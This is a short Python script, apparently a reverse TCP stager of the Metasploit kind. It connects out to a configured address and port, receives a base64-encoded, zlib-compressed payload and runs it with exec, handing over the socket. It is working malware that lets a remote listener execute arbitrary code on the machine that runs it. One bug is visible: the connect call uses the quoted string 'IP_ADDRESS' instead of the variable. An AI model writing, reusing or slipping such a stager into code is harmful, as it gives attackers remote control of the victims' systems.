import socket, zlib, base64, struct, time
IP_ADDRESS = "0.0.0.0"
PORT = 8080

for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('IP_ADDRESS',PORT))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
